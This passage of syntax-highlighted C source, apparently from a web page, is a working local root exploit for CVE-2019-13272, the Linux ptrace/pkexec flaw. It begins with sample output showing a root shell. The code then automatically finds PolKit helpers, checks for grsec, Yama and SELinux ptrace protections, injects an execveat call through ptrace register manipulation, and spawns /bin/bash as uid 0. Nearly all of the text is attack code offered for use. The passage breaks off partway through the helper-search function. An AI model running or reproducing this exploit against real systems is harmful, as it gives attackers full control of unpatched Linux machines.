(CVE-2019-13272)</span></span><br><span class="line"><span class="comment">// [.] Checking environment ...</span></span><br><span class="line"><span class="comment">// [~] Done, looks good</span></span><br><span class="line"><span class="comment">// [.] Searching policies for useful helpers ...</span></span><br><span class="line"><span class="comment">// [.] Ignoring helper (does not exist): /usr/sbin/pk-device-rebind</span></span><br><span class="line"><span class="comment">// [.] Trying helper: /usr/libexec/gsd-backlight-helper</span></span><br><span class="line"><span class="comment">// [.] Spawning suid process (/usr/bin/pkexec) ...</span></span><br><span class="line"><span class="comment">// [.] Tracing midpid ...</span></span><br><span class="line"><span class="comment">// [~] Attached to midpid</span></span><br><span class="line"><span class="comment">// [root@localhost CVE-2019-13272]# id</span></span><br><span class="line"><span class="comment">// uid=0(root) gid=0(root) groups=0(root),1000(user)</span></span><br><span class="line"><span class="comment">// [root@localhost CVE-2019-13272]# uname -a</span></span><br><span class="line"><span class="comment">// Linux localhost.localdomain 4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/elf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> dprintf printf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> dprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * enabled automatic targeting.</span></span><br><span class="line"><span class="comment"> * uses pkaction to search PolKit policy actions for viable helper executables.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ENABLE_AUTO_TARGETING   1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fall back to known helpers if automatic targeting fails.</span></span><br><span class="line"><span class="comment"> * note: use of these helpers may result in PolKit authentication</span></span><br><span class="line"><span class="comment"> *       prompts on the session associated with the PolKit agent.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ENABLE_FALLBACK_HELPERS 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *SHELL = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> middle_success = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> block_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> self_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> dummy_status;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *helper_path;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *pkexec_path = <span class="string">&quot;/usr/bin/pkexec&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *pkaction_path = <span class="string">&quot;/usr/bin/pkaction&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *helpers[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* known helpers to use if automatic targeting fails */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ENABLE_FALLBACK_HELPERS</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *known_helpers[] = &#123;</span><br><span class="line">  <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/unity-settings-daemon/usd-wacom-led-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/x86_64-linux-gnu/cinnamon-settings-daemon/csd-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/sbin/mate-power-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/sbin/xfce4-pm-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/bin/xfpm-power-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/bin/lxqt-backlight_backend&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/libexec/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/libexec/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/libexec/gsd-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/gsd-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/usr/lib64/xfce4/session/xsfm-shutdown-helper&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* helper executables known to cause problems (hang or fail) */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *blacklisted_helpers[] = &#123;</span><br><span class="line">  <span class="string">&quot;/xf86-video-intel-backlight-helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/cpugovctl&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/resetxpad&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/package-system-locked&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/cddistupgrader&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAFE(expr) (&#123;                   \</span></span><br><span class="line"><span class="meta">  typeof(expr) __res = (expr);          \</span></span><br><span class="line"><span class="meta">  <span class="meta-keyword">if</span> (__res == -1) &#123;                    \</span></span><br><span class="line"><span class="meta">    dprintf(<span class="meta-string">&quot;[-] Error: %s\n&quot;</span>, #expr);  \</span></span><br><span class="line"><span class="meta">    return 0;                           \</span></span><br><span class="line"><span class="meta">  &#125;                                     \</span></span><br><span class="line"><span class="meta">  __res;                                \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b) ? (a) : (b))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * execveat() syscall</span></span><br><span class="line"><span class="comment"> * https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_execveat</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __NR_execveat 322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* temporary printf; returned pointer is valid until next tprintf */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">tprintf</span><span class="params">(<span class="keyword">char</span> *fmt, ...)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">10000</span>];</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, fmt);</span><br><span class="line">  <span class="built_in">vsprintf</span>(buf, fmt, ap);</span><br><span class="line">  va_end(ap);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fork, execute pkexec in parent, force parent to trace our child process,</span></span><br><span class="line"><span class="comment"> * execute suid executable (pkexec) in child.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_main</span><span class="params">(<span class="keyword">void</span> *dummy)</span> </span>&#123;</span><br><span class="line">  prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">  <span class="keyword">pid_t</span> middle = getpid();</span><br><span class="line"></span><br><span class="line">  self_fd = SAFE(open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pid_t</span> child = SAFE(fork());</span><br><span class="line">  <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line"></span><br><span class="line">    SAFE(dup2(self_fd, <span class="number">42</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spin until our parent becomes privileged (have to be fast here) */</span></span><br><span class="line">    <span class="keyword">int</span> proc_fd = SAFE(open(tprintf(<span class="string">&quot;/proc/%d/status&quot;</span>, middle), O_RDONLY));</span><br><span class="line">    <span class="keyword">char</span> *needle = tprintf(<span class="string">&quot;\nUid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line">      <span class="keyword">ssize_t</span> buflen = SAFE(pread(proc_fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="number">0</span>));</span><br><span class="line">      buf[buflen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, needle)) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is where the bug is triggered.</span></span><br><span class="line"><span class="comment">     * while our parent is in the middle of pkexec, we force it to become our</span></span><br><span class="line"><span class="comment">     * tracer, with pkexec&#x27;s creds as ptracer_cred.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    SAFE(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * now we execute a suid executable (pkexec).</span></span><br><span class="line"><span class="comment">     * Because the ptrace relationship is considered to be privileged,</span></span><br><span class="line"><span class="comment">     * this is a proper suid execution despite the attached tracer,</span></span><br><span class="line"><span class="comment">     * not a degraded one.</span></span><br><span class="line"><span class="comment">     * at the end of execve(), this process receives a SIGTRAP from ptrace.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    execl(pkexec_path, basename(pkexec_path), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    dprintf(<span class="string">&quot;[-] execl: Executing suid executable failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SAFE(dup2(self_fd, <span class="number">0</span>));</span><br><span class="line">  SAFE(dup2(block_pipe[<span class="number">1</span>], <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* execute pkexec as current user */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">  <span class="keyword">if</span> (pw == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[-] getpwuid: Failed to retrieve username&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  middle_success = <span class="number">1</span>;</span><br><span class="line">  execl(pkexec_path, basename(pkexec_path), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name,</span><br><span class="line">        helper_path,</span><br><span class="line">        <span class="string">&quot;--help&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">  middle_success = <span class="number">0</span>;</span><br><span class="line">  dprintf(<span class="string">&quot;[-] execl: Executing pkexec failed&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ptrace pid and wait for signal */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">force_exec_and_wait</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> exec_fd, <span class="keyword">char</span> *arg0)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = &amp;regs, .iov_len = <span class="keyword">sizeof</span>(regs) &#125;;</span><br><span class="line">  SAFE(ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">  SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line">  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* set up indirect arguments */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> scratch_area = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">injected_page</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> envv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> arg0[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">char</span> path[<span class="number">1</span>];</span><br><span class="line">  &#125; ipage = &#123;</span><br><span class="line">    .argv = &#123; scratch_area + offsetof(struct injected_page, arg0) &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">strcpy</span>(ipage.arg0, arg0);</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(ipage)/<span class="keyword">sizeof</span>(<span class="keyword">long</span>); i++) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pdata = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ipage)[i];</span><br><span class="line">    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">                (<span class="keyword">void</span>*)pdata));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* execveat(exec_fd, path, argv, envv, flags) */</span></span><br><span class="line">  regs.orig_rax = __NR_execveat;</span><br><span class="line">  regs.rdi = exec_fd;</span><br><span class="line">  regs.rsi = scratch_area + offsetof(struct injected_page, path);</span><br><span class="line">  regs.rdx = scratch_area + offsetof(struct injected_page, argv);</span><br><span class="line">  regs.r10 = scratch_area + offsetof(struct injected_page, envv);</span><br><span class="line">  regs.r8 = AT_EMPTY_PATH;</span><br><span class="line"></span><br><span class="line">  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line">  SAFE(ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">  SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_stage2</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* our child is hanging in signal delivery from execve()&#x27;s SIGTRAP */</span></span><br><span class="line">  <span class="keyword">pid_t</span> child = SAFE(waitpid(<span class="number">-1</span>, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line">  <span class="keyword">return</span> force_exec_and_wait(child, <span class="number">42</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  SAFE(setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">  SAFE(setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">  execlp(SHELL, basename(SHELL), <span class="literal">NULL</span>);</span><br><span class="line">  dprintf(<span class="string">&quot;[-] execlp: Executing shell %s failed&quot;</span>, SHELL);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_env</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> warn = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* xdg_session = getenv(<span class="string">&quot;XDG_SESSION_ID&quot;</span>);</span><br><span class="line"></span><br><span class="line">  dprintf(<span class="string">&quot;[.] Checking environment ...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stat(pkexec_path, &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[-] Could not find pkexec executable at %s\n&quot;</span>, pkexec_path);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stat(<span class="string">&quot;/dev/grsec&quot;</span>, &amp;st) == <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[!] Warning: grsec is in use\n&quot;</span>);</span><br><span class="line">    warn++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (xdg_session == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[!] Warning: $XDG_SESSION_ID is not set\n&quot;</span>);</span><br><span class="line">    warn++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (system(<span class="string">&quot;/bin/loginctl --no-ask-password show-session \&quot;$XDG_SESSION_ID\&quot; | /bin/grep Remote=no &gt;&gt;/dev/null 2&gt;&gt;/dev/null&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[!] Warning: Could not find active PolKit agent\n&quot;</span>);</span><br><span class="line">    warn++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (system(<span class="string">&quot;/sbin/sysctl kernel.yama.ptrace_scope 2&gt;&amp;1 | /bin/grep -q [23]&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[!] Warning: kernel.yama.ptrace_scope &gt;= 2\n&quot;</span>);</span><br><span class="line">    warn++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stat(<span class="string">&quot;/usr/sbin/getsebool&quot;</span>, &amp;st) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (system(<span class="string">&quot;/usr/sbin/getsebool deny_ptrace 2&gt;&amp;1 | /bin/grep -q on&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      dprintf(<span class="string">&quot;[!] Warning: SELinux deny_ptrace is enabled\n&quot;</span>);</span><br><span class="line">      warn++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (warn &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[~] Done, with %d warnings\n&quot;</span>, warn);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[~] Done, looks good\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> warn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use pkaction to search PolKit policy actions for viable helper executables.</span></span><br><span class="line"><span class="comment"> * Check each action for allow_active=yes, extract the associated helper path,</span></span><br><span class="line"><span class="comment"> * and check the helper path exists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ENABLE_AUTO_TARGETING</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_helpers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (stat(pkaction_path, &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[-] No helpers found. Could not find pkaction executable at %s.\n&quot;</span>, pkaction_path);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> cmd[<span class="number">1024</span>];</span><br><span class="line">  <span class="built_in">snprintf</span>(cmd, <span class="keyword">sizeof</span>(cmd), <span class="string">&quot;%s --verbose&quot;</span>, pkaction_path);</span><br><span class="line">  FILE *fp;</span><br><span class="line">  fp = popen(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">&quot;[-] Failed to run %s: %m\n&quot;</span>, cmd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> line[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line">  <span class="keyword">int</span> helper_index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> useful_action = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> blacklisted_helper = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *needle = <span class="string">&quot;org.freedesktop.policykit.exec.path -&gt; &quot;</span>;</span><br><span class="line">  <span class="keyword">int</span> needle_length = <span class="built_in">strlen</span>(needle);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line)<span class="number">-1</span>, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* check the action uses allow_active=yes */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;implicit active:&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;yes&quot;</span>)) &#123;</span><br><span class="line">        useful_action = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (useful_action == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    useful_action = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* extract the helper path */</span></span><br><span class="line">    <span class="keyword">int</span> length = <span class="built_in">strlen</span>(line);</span><br><span class="line">    <span class="keyword">char</span>* found = memmem(&amp;line[<span class="number">0</span>], length, needle, needle_length);</span><br><span class="line">    <span class="keyword">if</span> (found == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; found[needle_length + i] != <span class="string">&#x27;\n&#x27;</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &gt;= <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      buffer[i] = found[needle_length + i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check helper path against helpers defined in &#x27;blacklisted_helpers&#x27; array */</span></span><br><span class="line">    blacklisted_helper = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(blacklisted_helpers)/<span class="keyword">sizeof</span>(blacklisted_helpers[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(&amp;buffer[<span class="number">0</span>], blacklisted_helpers[i]) != <span class="number">0</span>) &#123;</span><br><span class="line">        dprintf(<span class="string">&quot;[.] Ignoring helper (blacklisted): %s\n&quot;</span>, &amp;buffer[<span class="number">0</span>]);</span><br><span class="line">        blacklisted_helper = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (blacklisted_helper == <span class="number">1</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check the path exists */</span></span><br><span class="line">    <span class="keyword">if</span> (stat(&amp;buffer[<span class="number">0</span>], &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">      dprintf(<span class="string">&quot;[.] Ignoring helper (does not exist): %s\n&quot;</span>, &amp;buffer[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    helpers[helper_index] = strndup(&amp;buffer[<span class="number">0</span>], <span class="built_in">strlen</span>(buffer));</span><br><span class="line">    helper_index++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (helper_index &gt;= <span class="keyword">sizeof</span>(helpers)/<span class="keyword">sizeof</span>(helpers[<span class="number">0</span>]))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 